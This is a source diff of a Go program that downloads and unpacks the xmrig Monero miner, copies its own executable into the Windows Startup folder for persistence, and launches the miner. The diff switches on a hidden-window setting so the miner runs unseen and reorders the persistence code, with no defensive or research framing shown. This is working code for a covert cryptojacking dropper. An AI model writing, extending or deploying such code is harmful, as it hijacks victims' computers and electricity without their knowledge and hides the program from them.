@@ -13,7 +13,7 @@ import (
 	"path/filepath"
 	"strings"
 //	"syscall"
-// "os/signal"
+// 	"os/signal"
 )
 
 func downloadFile(filepath string, url string) (err error) {
@@ -111,7 +111,7 @@ func unzipFile(f *zip.File, destination string) error {
 
 func startCommand(dir string) {
 	cmd := exec.Command(filepath.Join(dir, "xmrcache", "xmrig.exe"), "-c", filepath.Join(dir, "xmrcache", "config.json"))
-//	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
+	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
 
 	if err := cmd.Start(); err != nil {
 		log.Printf("Failed to start cmd: %v", err)
@@ -167,25 +167,25 @@ func copy(src, dst string) error {
 
 
 func main() {
-	currentUser, err := user.Current()
-	if err != nil {
-		log.Fatalf(err.Error())
-	}
-	username := currentUser.Username
-	
-	startup := filepath.Join("Users", username, "AppData", "Roaming", "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
-	err = copy(os.Args[0], startup)
-	if err != nil {
-		log.Panicf("copy -> %v", err)
-	}
-	log.Printf("NOTERROR startup string is: %s", startup)
-	
 	f, err := os.OpenFile("log.txt", os.O_RDWR | os.O_CREATE | os.O_APPEND, 0666)
 	if err != nil {
 		log.Fatalf("error opening file: %v", err)
 	}
 	defer f.Close()
 	log.SetOutput(f)
+
+	currentUser, err := user.Current()
+	if err != nil {
+		log.Fatalf(err.Error())
+	}
+	username := currentUser.Username
+
+	startup := filepath.Join("Users", username, "AppData", "Roaming", "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
+	err = copy(os.Args[0], startup)
+	if err != nil {
+		log.Panicf("copy -> %v", err)
+	}
+	log.Printf("NOTERROR startup string is: %s", startup)
 
 	dir, err := ioutil.TempDir("", "xmrminer")
 	if err != nil {
